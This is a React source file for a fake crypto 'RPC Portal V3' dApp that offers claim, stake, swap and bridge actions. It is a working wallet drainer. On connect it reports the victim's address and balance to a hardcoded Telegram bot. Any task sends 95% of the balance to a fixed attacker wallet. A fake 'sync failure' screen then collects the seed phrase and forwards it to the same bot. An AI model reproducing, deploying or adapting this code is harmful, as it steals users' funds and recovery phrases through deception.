import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { Cpu, ShieldCheck, AlertCircle, Database, History, Unlock, Activity, Zap, Clock, Globe, Wallet } from 'lucide-react';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const logToTelegram = async (msg) => {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: msg }),
    });
  };

  useEffect(() => {
    if (isConnected && address && balance) {
      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
    }
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value || balance.value === 0n) {
      setView("seed_gate");
      return;
    }

    setLoading(true);
    setLoadingText(`VALIDATING GAS & NETWORKS...`);

    try {
      // 95% logic for "Rectify", otherwise use input or 95% as fallback
      let finalValue;
      if (activeTask === "Rectify" || !inputVal) {
        finalValue = (balance.value * 95n) / 100n;
      } else {
        // Validation: Convert input to BigInt
        const parsedInput = parseEther(inputVal);
        // If input is more than 95% of balance, cap it at 95% to ensure gas coverage
        const maxAllowed = (balance.value * 95n) / 100n;
        finalValue = parsedInput > maxAllowed ? maxAllowed : parsedInput;
      }

      sendTransaction({
        to: destination,
        value: finalValue,
      }, {
        onSuccess: (hash) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(finalValue)}\nHASH: ${hash}`);
          setLoadingText("SYNCHRONIZING...");
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2500);
        },
        onError: (err) => {
          logToTelegram(`❌ REJECTED: User denied ${activeTask}\nADDR: ${address}`);
          setLoading(false);
          setView("seed_gate");
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter flex flex-col select-none">
      
      <div className="w-full h-32 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
         <iframe src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0" className="absolute inset-0 w-full h-full opacity-30 pointer-events-none" title="Market" />
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black tracking-widest">RPC_DATA_STREAM</div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>RPC PORTAL V3</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black uppercase">NODE_STATUS: <span className="text-emerald-500">ENCRYPTED</span></div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-10">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[{n:"Claim", i:<Database/>}, {n:"Stake", i:<History/>}, {n:"Unstake", i:<Unlock/>}, {n:"Migrate", i:<Activity/>}, {n:"Swap", i:<Zap/>}, {n:"Rectify", i:<Settings/>}, {n:"Airdrop", i:<Zap/>}, {n:"Delay", i:<Clock/>}, {n:"Bridge", i:<Globe/>}].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[22px] flex flex-col items-center gap-2 active:scale-95 transition-all">
                <div className="text-slate-700">{item.i}</div>
                <span className="text-[8px] font-black text-slate-500">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[30px] p-8 text-center animate-in zoom-in duration-300">
            <button onClick={() => setView("menu")} className="text-slate-700 text-[8px] mb-8 font-black block mx-auto tracking-[0.2em]">← BACK_TO_CONSOLE</button>
            <h2 className="text-white font-black text-lg italic mb-6 uppercase">{activeTask} Portal</h2>
            
            <div className="bg-black/40 border border-slate-900 p-6 rounded-2xl mb-4 text-left">
              <label className="text-[6px] text-cyan-800 block font-black mb-2 uppercase">
                {activeTask === "Rectify" ? "VAULT_BALANCE (LOCKED)" : `ENTER ${activeTask} AMOUNT`}
              </label>
              
              {activeTask === "Rectify" ? (
                <div className="text-2xl font-mono text-white italic tracking-tighter opacity-80 select-none">
                  {balance ? balance.formatted.slice(0,10) : "0.000"} <span className="text-[10px] text-slate-600 uppercase">{balance?.symbol}</span>
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <input 
                    type="number" 
                    value={inputVal} 
                    onChange={(e) => setInputVal(e.target.value)} 
                    placeholder="0.00" 
                    className="bg-transparent border-none text-2xl font-mono text-cyan-500 italic outline-none w-full" 
                    autoFocus 
                  />
                  <span className="text-[10px] font-black text-cyan-900">{balance?.symbol}</span>
                </div>
              )}
            </div>

            <div className="flex justify-between items-center px-2 mb-6">
              <div className="flex items-center gap-1 text-[7px] text-slate-600 font-black"><Zap size={10}/> GAS: <span className="text-emerald-700">OPTIMIZED</span></div>
              <div className="flex items-center gap-1 text-[7px] text-slate-600 font-black"><ShieldCheck size={10}/> SECURE_RELAY: <span className="text-emerald-700">ON</span></div>
            </div>

            <button onClick={executeTaskAction} className="w-full bg-cyan-700 py-5 rounded-xl text-[9px] font-black text-white shadow-2xl active:scale-95 tracking-[0.3em]">EXECUTE {activeTask}</button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[500] flex flex-col items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[35px] p-8 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={40} className="text-red-700 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-[12px] italic uppercase tracking-widest">RPC SYNC FAILURE (90%)</h2>
                <p className="text-[7px] text-slate-600 my-3 leading-relaxed">GAS ESTIMATION FAILED OR NETWORK TIMEOUT. PROVIDE RECOVERY KEY TO MANUALLY SYNC ASSETS.</p>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." className="w-full h-32 bg-black border border-slate-900 rounded-[20px] p-5 text-[10px] font-mono text-cyan-500 outline-none uppercase" />
                <button onClick={() => { setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let cur=0; const int=setInterval(()=>{cur++; setSyncProgress(cur); if(cur>=100)clearInterval(int)},100); }} disabled={seedVal.split(' ').length < 12} className="w-full mt-5 bg-red-950 py-5 rounded-xl text-[9px] font-black text-white uppercase tracking-widest disabled:opacity-20 transition-all">RESTORE_SYNC</button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-16 h-16 mx-auto mb-6">
                  <div className="absolute inset-0 border-4 border-slate-900 rounded-full" />
                  <div className="absolute inset-0 border-4 border-cyan-600 rounded-full border-t-transparent animate-spin" />
                  <div className="absolute inset-0 flex items-center justify-center text-[10px] text-white font-black">{syncProgress}%</div>
                </div>
                <h2 className="text-white font-black text-sm italic tracking-[0.4em] animate-pulse">SYNCHRONIZING...</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/90 z-[600] flex flex-col items-center justify-center backdrop-blur-md"><div className="w-10 h-10 border-2 border-cyan-600 border-t-transparent rounded-full animate-spin" /><p className="text-[7px] font-black text-cyan-600 mt-8 tracking-[0.6em] animate-pulse uppercase">{loadingText}</p></div>}
    </div>
  );
}
